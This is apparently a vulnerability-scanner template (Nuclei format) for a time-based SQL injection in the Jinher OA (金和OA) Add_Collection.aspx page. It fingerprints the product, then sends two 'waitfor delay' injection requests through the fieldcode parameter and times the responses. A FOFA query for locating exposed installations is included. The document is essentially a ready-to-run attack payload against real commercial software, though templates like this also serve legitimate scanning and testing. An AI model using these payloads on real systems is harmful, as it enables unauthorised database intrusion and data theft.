id: poc-yaml-jinher-jhsoft-add-collection-aspx-sqli
info:
  name: 金和OA Add_Collection.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  metadata:
    finger: 金和OA
    fofa: app="金和网络-金和OA"

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.govset/Add_Collection.aspx/?fieldcode=1'waitfor+delay%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/Jhsoft.Web.govset/Add_Collection.aspx/?fieldcode=1'waitfor+delay%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "waitfor+delay"
          - "添加集合"
      - type: word
        part: header
        words:
          - "Cookie:"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
